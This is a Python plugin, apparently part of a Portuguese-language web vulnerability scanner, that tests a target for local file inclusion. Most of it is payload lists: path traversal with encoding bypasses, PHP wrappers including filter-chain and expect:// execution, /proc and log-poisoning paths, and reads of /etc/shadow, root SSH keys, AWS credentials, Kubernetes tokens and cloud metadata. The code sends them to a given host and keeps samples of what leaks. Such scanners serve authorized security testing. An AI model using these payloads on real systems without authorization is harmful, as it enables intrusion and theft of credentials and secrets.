# plugins/lfi_scanner.py — Cascavel 2026 Intelligence
import urllib.parse

import requests

PARAMS = [
    "file",
    "page",
    "path",
    "include",
    "template",
    "doc",
    "folder",
    "view",
    "content",
    "cat",
    "dir",
    "action",
    "board",
    "date",
    "detail",
    "download",
    "module",
    "controller",
    "func",
    "load",
    "filename",
    "document",
    "attachment",
    "report",
    "img",
    "image",
    "lang",
    "locale",
]

LINUX_INDICATOR = "root:"

# ──────────── TRAVERSAL PAYLOADS ────────────
TRAVERSAL_PAYLOADS = [
    # Classic
    ("../../../etc/passwd", LINUX_INDICATOR, "BASIC_TRAVERSAL"),
    ("../../../../etc/passwd", LINUX_INDICATOR, "DEEP_TRAVERSAL"),
    ("../../../../../etc/passwd", LINUX_INDICATOR, "DEEPER_TRAVERSAL"),
    ("..\\..\\..\\etc\\passwd", LINUX_INDICATOR, "BACKSLASH"),
    # Filter bypass
    ("....//....//....//etc/passwd", LINUX_INDICATOR, "DOUBLE_DOT_BYPASS"),
    ("..%2f..%2f..%2fetc%2fpasswd", LINUX_INDICATOR, "URL_ENCODE"),
    ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", LINUX_INDICATOR, "DOUBLE_ENCODE"),
    ("..%c0%af..%c0%afetc/passwd", LINUX_INDICATOR, "UNICODE_OVERLONG"),
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", LINUX_INDICATOR, "OVERLONG_DOT"),
    ("..%25c0%25af..%25c0%25afetc/passwd", LINUX_INDICATOR, "TRIPLE_ENCODE"),
    ("..%ef%bc%8f..%ef%bc%8fetc/passwd", LINUX_INDICATOR, "FULLWIDTH_SLASH"),
    # Null byte (PHP < 5.3.4)
    ("../../../etc/passwd%00", LINUX_INDICATOR, "NULL_BYTE"),
    ("../../../etc/passwd%00.jpg", LINUX_INDICATOR, "NULL_BYTE_EXT"),
    # Windows
    ("..\\..\\..\\windows\\win.ini", "[fonts]", "WIN_INI"),
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "localhost", "WIN_HOSTS"),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini", "[fonts]", "DOUBLE_BACKSLASH"),
]

# ──────────── PHP WRAPPERS (2026 Focus) ────────────
PHP_WRAPPER_PAYLOADS = [
    ("php://filter/convert.base64-encode/resource=index.php", "PD9w", "PHP_FILTER_B64"),
    ("php://filter/convert.base64-encode/resource=config.php", "PD9w", "PHP_FILTER_CONFIG"),
    ("php://filter/convert.base64-encode/resource=../config.php", "PD9w", "PHP_FILTER_PARENT"),
    ("php://filter/convert.base64-encode/resource=.env", "PD9w", "PHP_FILTER_ENV"),
    ("php://filter/read=string.rot13/resource=index.php", "<?cuc", "PHP_FILTER_ROT13"),
    # PHP filter chain RCE (2025-2026 technique)
    (
        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php",
        "",
        "PHP_FILTER_CHAIN",
    ),
    ("php://input", "", "PHP_INPUT"),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "phpinfo", "DATA_WRAPPER"),
    ("expect://id", "uid=", "EXPECT_WRAPPER"),
    ("phar://test.phar/test.txt", "", "PHAR_WRAPPER"),
    ("zip://test.zip#test.txt", "", "ZIP_WRAPPER"),
]

# ──────────── PROC FILESYSTEM ────────────
PROC_PAYLOADS = [
    ("....//....//....//proc/self/environ", "PATH=", "PROC_ENVIRON"),
    ("....//....//....//proc/self/cmdline", "", "PROC_CMDLINE"),
    ("....//....//....//proc/self/fd/0", "", "PROC_FD_0"),
    ("....//....//....//proc/self/fd/1", "", "PROC_FD_1"),
    ("....//....//....//proc/self/fd/2", "", "PROC_FD_2"),
    ("....//....//....//proc/self/status", "VmSize", "PROC_STATUS"),
    ("....//....//....//proc/self/maps", "r-xp", "PROC_MAPS"),
    ("....//....//....//proc/self/cgroup", "docker", "PROC_CGROUP"),
    ("....//....//....//proc/version", "Linux", "PROC_VERSION"),
    ("....//....//....//proc/net/tcp", "local_address", "PROC_NET_TCP"),
]

# ──────────── LOG POISONING (LFI → RCE chain) ────────────
LOG_PAYLOADS = [
    ("../../../var/log/apache2/access.log", "GET", "APACHE_ACCESS"),
    ("../../../var/log/apache2/error.log", "error", "APACHE_ERROR"),
    ("../../../var/log/nginx/access.log", "GET", "NGINX_ACCESS"),
    ("../../../var/log/nginx/error.log", "error", "NGINX_ERROR"),
    ("../../../var/log/auth.log", "sshd", "AUTH_LOG"),
    ("../../../var/log/mail.log", "postfix", "MAIL_LOG"),
    ("../../../var/log/syslog", "", "SYSLOG"),
    # Session files
    ("../../../var/lib/php/sessions/sess_", "", "PHP_SESSION"),
    ("../../../tmp/sess_", "", "PHP_SESSION_TMP"),
]

# ──────────── SENSITIVE FILES ────────────
SENSITIVE_PAYLOADS = [
    ("../../../etc/shadow", LINUX_INDICATOR, "SHADOW_FILE"),
    ("../../../etc/mysql/my.cnf", "mysqld", "MYSQL_CONFIG"),
    ("../../../etc/ssh/sshd_config", "Port", "SSH_CONFIG"),
    ("../../../etc/crontab", "cron", "CRONTAB"),
    ("../../../root/.ssh/id_rsa", "BEGIN", "SSH_KEY"),
    ("../../../root/.bash_history", "", "BASH_HISTORY"),
    ("../../../etc/fstab", "/dev/", "FSTAB"),
    ("../../../etc/resolv.conf", "nameserver", "RESOLV_CONF"),
    # Docker/K8s
    ("../../../.dockerenv", "", "DOCKER_DETECT"),
    ("../../../var/run/secrets/kubernetes.io/serviceaccount/token", "eyJ", "K8S_TOKEN"),
    # AWS
    ("../../../root/.aws/credentials", "aws_access_key_id", "AWS_CREDS"),
    # Cloud metadata via LFI
    ("http://169.254.169.254/latest/meta-data/", "ami-id", "AWS_METADATA_LFI"),
]


def _classify_severity(method):
    """Classifica severidade e descrição."""
    critical_methods = {
        "PHP_FILTER_B64": "PHP source code exposto via filter!",
        "PHP_FILTER_CONFIG": "Configuração PHP exposta via filter!",
        "PHP_FILTER_ENV": "Arquivo .env exposto via PHP filter!",
        "PHP_FILTER_CHAIN": "PHP filter chain — possível RCE!",
        "PHP_INPUT": "PHP input wrapper — possível RCE!",
        "DATA_WRAPPER": "Data wrapper — code execution!",
        "EXPECT_WRAPPER": "Expect wrapper — RCE direto!",
        "PROC_ENVIRON": "Environment variables expostos!",
        "PROC_CGROUP": "Container detectado via /proc/self/cgroup!",
        "PROC_NET_TCP": "Conexões de rede internas expostas!",
        "SHADOW_FILE": "Shadow file — credential theft!",
        "SSH_KEY": "Chave SSH privada exposta!",
        "AWS_CREDS": "AWS credentials expostas via LFI!",
        "K8S_TOKEN": "Kubernetes service account token exposto!",
        "AWS_METADATA_LFI": "LFI → Cloud metadata access!",
    }
    if method in critical_methods:
        return "CRITICO", critical_methods[method]

    log_methods = ("APACHE_ACCESS", "APACHE_ERROR", "NGINX_ACCESS", "NGINX_ERROR", "AUTH_LOG", "MAIL_LOG")
    if method in log_methods:
        return "CRITICO", "Log file incluso — chain com log poisoning para RCE!"

    return "ALTO", f"LFI confirmado via {method}"


def _test_lfi_get(target, param, payloads):
    """Testa LFI via GET em um parâmetro com lista de payloads."""
    for payload, indicator, method in payloads:
        url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
        try:
            resp = requests.get(url, timeout=6)
            if resp.status_code == 200 and indicator and indicator in resp.text:
                sev, desc = _classify_severity(method)
                return {
                    "tipo": "LFI",
                    "parametro": param,
                    "payload": payload[:80],
                    "metodo": method,
                    "severidade": sev,
                    "descricao": desc,
                    "amostra": resp.text[:200],
                }
        except Exception:
            continue
    return None


def _test_lfi_post(target, param):
    """Testa LFI via POST body."""
    for payload, indicator, method in TRAVERSAL_PAYLOADS[:5]:
        try:
            resp = requests.post(f"http://{target}/", data={param: payload}, timeout=6)
            if indicator and indicator in resp.text:
                return {
                    "tipo": "LFI_POST",
                    "parametro": param,
                    "payload": payload[:60],
                    "metodo": method,
                    "severidade": "ALTO",
                }
        except Exception:
            continue
    return None


def _test_path_in_url(target):
    """Testa LFI diretamente no path URL (REST-style)."""
    vulns = []
    path_payloads = [
        "/..%2f..%2f..%2fetc%2fpasswd",
        "/....//....//....//etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/static/..%252f..%252f..%252fetc/passwd",
    ]
    for path in path_payloads:
        try:
            resp = requests.get(f"http://{target}{path}", timeout=6)
            if LINUX_INDICATOR in resp.text:
                vulns.append(
                    {
                        "tipo": "LFI_PATH_URL",
                        "path": path[:60],
                        "severidade": "CRITICO",
                        "descricao": "LFI via URL path traversal!",
                    }
                )
                break
        except Exception:
            continue
    return vulns


def run(target, ip, open_ports, banners):
    """
    Scanner LFI 2026-Grade — Traversal, PHP Wrappers, Proc, Logs, Sensitive Files.

    Técnicas: 16 traversal payloads (classic/encoding/overlong/null byte/Windows),
    11 PHP wrapper payloads (filter chain RCE 2026, data/expect/phar/zip),
    10 /proc filesystem paths, 9 log poisoning paths, 12 sensitive files
    (shadow/SSH key/AWS creds/K8s token), URL path traversal, POST body LFI.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for param in PARAMS:
        # 1. Traversal payloads
        vuln = _test_lfi_get(target, param, TRAVERSAL_PAYLOADS)
        if vuln:
            vulns.append(vuln)

        # 2. PHP wrappers
        vuln = _test_lfi_get(target, param, PHP_WRAPPER_PAYLOADS)
        if vuln:
            vulns.append(vuln)

        # 3. /proc filesystem
        vuln = _test_lfi_get(target, param, PROC_PAYLOADS)
        if vuln:
            vulns.append(vuln)

        # 4. Log poisoning
        vuln = _test_lfi_get(target, param, LOG_PAYLOADS)
        if vuln:
            vulns.append(vuln)

        # 5. Sensitive files
        vuln = _test_lfi_get(target, param, SENSITIVE_PAYLOADS)
        if vuln:
            vulns.append(vuln)

        # 6. POST body LFI
        vuln = _test_lfi_post(target, param)
        if vuln:
            vulns.append(vuln)

    # 7. Path in URL
    vulns.extend(_test_path_in_url(target))

    return {
        "plugin": "lfi_scanner",
        "versao": "2026.1",
        "tecnicas": [
            "traversal",
            "php_wrappers",
            "filter_chain_rce",
            "proc_fs",
            "log_poisoning",
            "sensitive_files",
            "null_byte",
            "encoding_bypass",
            "path_url",
            "post_body",
        ],
        "resultados": vulns if vulns else "Nenhum LFI detectado",
    }
